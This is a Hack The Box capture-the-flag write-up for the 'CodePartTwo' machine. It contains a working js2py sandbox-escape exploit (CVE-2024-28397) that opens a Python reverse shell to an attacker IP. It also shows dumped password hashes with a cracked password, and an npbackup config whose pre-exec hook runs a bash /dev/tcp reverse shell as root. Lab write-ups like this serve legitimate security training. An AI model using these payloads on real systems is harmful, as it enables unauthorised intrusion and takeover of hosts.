# CodePartTwo Machine Write-up

## Reconnaissance

1. **Starting with nmap. Only 22 SSH and HTTP in atypical port 8000 was found.**

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.82 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sV -sC 10.10.11.82

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web

2. **Accessing the web page on port `8000`, three interesting endpoints were identified: register, `login` and `download`.** 

3. **Initially a user account was created. Upon logging in, a text field was available for writing javascript code, along with two options: save code and  run code.**

4. **Attempting to run payloads to gain a reverse shell many errors were returned, like `not defined` to operations using `require fetch` and `documents`. Suggesting it to be a limited environment.**

5. **Then, through the previously mentioned `/download` endpoint, the application files were obtained. While reviewing them, the following was found:**

    The <u>app/app.py</u> file containing the logic behind the application’s console, that revealed the library used, called **js2py**. 

    ```python
    @app.route('/run_code', methods=['POST'])
    def run_code():
        try:
            code = request.json.get('code')
            result = js2py.eval_js(code)
            return jsonify({'result': result})
        except Exception as e:
            return jsonify({'error': str(e)})
    ```

    - <u>request.json.get('code')</u>: Obtain the javascript code from the JSON request body.
    - <u>js2py.eval_js(code)</u>: run the javascript code. 
    - returns the result like JSON or an error.

    The file <u>app/requirements.txt</u> that specifies the js2py library version used in the application.

    ```
    js2py==0.74
    ```

    An <u>app/instance/users.db</u> file was also found, but it didn’t contain any tables. 

## Exploitation

### CVE-2024-28397

6. **During research it was discovered that this library allows Javascript code to be executed within a python environment by converting JS into PY.**

    Js2Py’s sandbox is limited: it isolates JS only at the variable scope level, and does not prevent python functions from being called if they are exposed. Then led to `CVE-2024-28397`.

    The `CVE-2024-28397` affects `Js2py` up to version 0.74. This vulnerability allows running arbitrary code on the host system even when `disable_pyimport()` is enabled, which is supposed to prevent Javascript code from accessing Python objects. 

## Initial Access 

7. **Then, a payload was developed to exploit the vulnerability, aiming to obtain a reverse shell.**

    ```javascript
    let cmd = "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.138',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"";

    let hacked = Object.getOwnPropertyNames({});
    let bymarve = hacked.__getattribute__;
    let n11 = bymarve("__getattribute__");
    let obj = n11("__class__").__base__;

    function findpopen(o) {
        let result;
        for(let i in o.__subclasses__()) {
            let item = o.__subclasses__()[i];
            if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
                return item;
            }
            if(item.__name__ != "type" && (result = findpopen(item))) {
                return result;
            }
        }
    }

    let popen_class = findpopen(obj);
    let process = popen_class(cmd, -1, null, -1, -1, -1, null, null, true);
    process.communicate();
    "Reverse shell executed";
    ```

8. **Initial access to the target internal system was successfully gained with the reverse shell exploit and with the `app` user. The users.db file was also found, in this case, it has a ‘user’ table containing ‘app’ and ‘marco’ users along with their hashes.**

    ```bash
    app@codetwo:~/app/instance$ sqlite3 users.db
    sqlite3 users.db
    SQLite version 3.31.1 2020-01-27 19:55:54
    Enter ".help" for usage hints.
    sqlite> .table
    .table
    code_snippet  user        
    sqlite> select * from user;
    select * from user;
    1|marco|649c9d65a206a75f5abe509fe128bce5
    2|app|a97588c0e2fa3a024876339e27aeb42e
    ```
## Privilege Escalation 

9. **The marco’s hash was cracked using `crackstation`.** 

    https://crackstation.net/ >> ‘sweetangelbabylove’

10. **The password obtained for user `marco` was successfully used to log in.  From that point onward, SSH was used to access the target system.**

    ```bash
    app@codetwo:~/app/instance$ su marco
    su marco
    Password: sweetangelbabylove

    marco@codetwo:/home/app/app/instance$ 
    ```

## Post-exploration 

11. **Initial verification as user `marco`:**

    He is a member of the ‘backups’ group.

    ```bash
    marco@codetwo:~$ id
    uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
    ```

    In its directory there was a folder named ‘backups’ owned by ‘root’ user and group, and a file named ‘npbackup.conf’, also owned by ‘root’ user. However, this had read permissions to ‘others’ and was responsible for backing up of the web application located at /home/app/app using a tool named ‘npbackup’.

    ```bash
    marco@codetwo:~$ ls -l
    total 12
    drwx------ 7 root root  4096 Apr  6 03:50 backups
    -rw-rw-r-- 1 root root  2893 Jun 18 11:16 npbackup.conf
    -rw-r----- 1 root marco   33 Aug 31 23:12 user.txt
    ```

    A directory owned by the ‘backups’ group was found in ‘/opt/npbackup-cli’, but it is empty.

    ```bash
    marco@codetwo:~$ find / -group backups 2>/dev/null
    /opt
    /opt/npbackup-cli
    ```

    User ‘marco’ is allowed to run ‘/usr/local/bin/npbackup-cli’ with sudo.

    ```bash
    marco@codetwo:/tmp$ sudo -l
    Matching Defaults entries for marco on codetwo:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User marco may run the following commands on codetwo:
        (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
    ```

### Privilege Escalation

12. **After gaining information about NetApp Backup (`npbackup`), the following steps were taken to escalate privileges to a root shell.** 

    1. <u>Create a new backup (snapshot) file, in this case targeting the /root directory and insert the command to be executed in order to obtain a root reverse shell.</u>

        To create the snapshot of the root directory, a folder named .ldk was created under /tmp, with a backups folder inside it. In the ‘paths’ section, ‘/root’ was specified as the directory to back up.

            repos:
            default:
                repo_uri: /tmp/.ldk/backups
                repo_group: default_group
                backup_opts:
                paths:
                - /root
                source_type: folder_list
                exclude_files_larger_than: 0.0
                repo_opts:
                retention_policy: {}
                prune_max_unused: 0
                prometheus:
                metrics: false
                env: {}
                is_protected: false

        To obtain the reverse shell, in the ‘pre_exec_commands’ field was inserted the following payload:

            pre_exec_commands:
            - bash -c 'exec 5<>/dev/tcp/10.10.14.138/443; cat <&5 | while read line; do $line 2>&5 >&5; done’

            Full file content:

            conf_version: 3.0.1
            audience: public
            repos:
            default:
                repo_uri: /tmp/.ldk/backups
                repo_group: default_group
                backup_opts:
                paths:
                - /root
                source_type: folder_list
                exclude_files_larger_than: 0.0
                repo_opts:
                retention_policy: {}
                prune_max_unused: 0
                prometheus:
                metrics: false
                env: {}
                is_protected: false
            groups:
            default_group:
                backup_opts:
                paths: []
                source_type:
                tags: []
                compression: auto
                use_fs_snapshot: true
                ignore_cloud_files: true
                one_file_system: false
                priority: low
                exclude_caches: true
                excludes_case_ignore: false
                exclude_files: []
                exclude_patterns: []
                additional_parameters: []
                pre_exec_commands:
                    - bash -c 'exec 5<>/dev/tcp/10.10.14.138/443; cat <&5 | while read line; do $line 2>&5 >&5; done'
                pre_exec_per_command_timeout: 3600
                pre_exec_failure_is_fatal: false
                post_exec_commands: []
                post_exec_per_command_timeout: 3600
                post_exec_failure_is_fatal: false
                post_exec_execute_even_on_backup_error: true
                post_backup_housekeeping_percent_chance: 0
                post_backup_housekeeping_interval: 0
                repo_opts:
                repo_password: "SenhaForte123!"
                repo_password_command: ""
            identity:
            machine_id: tmp_machine
            machine_group: default_group
            global_options:
            auto_upgrade: false

    2. <u>Initialize a new repository in /tmp/.ldk/backups.</u>

        ```bash
        sudo /usr/local/bin/npbackup-cli --config /tmp/.ldk/backup.conf --init
        ```

    3. <u>Perform the backup.</u>

        ```bash
        sudo /usr/local/bin/npbackup-cli --config /tmp/.ldk/backup.conf --backup
        ```

13. **Dump the `root.txt` flag located in the `/root` directory of the snapshot.** 

    ```bash
    sudo /usr/local/bin/npbackup-cli --config /tmp/.ldk/backup.conf --dump /root/root.txt --snapshot-id latest > /tmp/.ldk/root.txt
    ```

    The root.txt file containing the root flag is now available in /tmp/.ldk:

    ```bash
    marco@codetwo:/tmp/.ldk$ sudo /usr/local/bin/npbackup-cli --config /tmp/.ldk/backup.conf --dump /root/root.txt --snapshot-id latest > /tmp/.ldk/root.txt
    marco@codetwo:/tmp/.ldk$ ls
    backup.conf  backups  root.txt
    marco@codetwo:/tmp/.ldk$ cat root.txt
    6b5af3ca48bb054e214125c50198371f
    ```

## Root

14. **The reverse shell with root user was obtained.**

    ```bash
    lucas@lucas:~/workspace/htb-machines/CodeTwo$ sudo nc -lvnp 443
    [sudo] password for lucas: 
    Listening on 0.0.0.0 443
    Connection received on 10.10.11.82 34460
    script /dev/null -c bash
    Script started, file is /dev/null
    root@codetwo:/tmp/.ldk# id
    id
    uid=0(root) gid=0(root) groups=0(root)
    ```
<div align="center">

## <a href=”https://labs.hackthebox.com/achievement/machine/2088593/692”>HTB Machine Certificate<a>

</div>





